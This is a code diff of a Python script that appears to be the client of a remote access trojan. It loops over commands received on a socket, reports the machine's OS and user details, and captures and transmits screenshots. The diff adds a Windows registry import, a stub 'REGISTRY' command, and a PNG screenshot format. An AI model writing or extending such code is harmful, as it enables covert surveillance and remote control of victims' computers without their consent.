@@ -7,6 +7,7 @@ import struct
 import platform
 from time import sleep
 import pyautogui
+import winreg
 
 def start_session(s):
     while True:
@@ -24,10 +25,18 @@ def start_session(s):
                 details += "User(node) : %s\n"%(str(os_user))
                 s.send(details.encode())
 
+            if "REGISTRY" in cmd:
+                try:
+
+                    pass #BETA
+                except:
+                    s.send("FAILED".encode())
+
             if "screenshot" in cmd:
                 try:
-                    pyautogui.screenshot("HP.jpeg")
-                    file = open("HP.jpeg",'rb')
+                    extension = ".png"
+                    pyautogui.screenshot("HP" + extension)
+                    file = open("HP"+extension,'rb')
                     data = file.read()
                     file.close()
                     size = len(data)
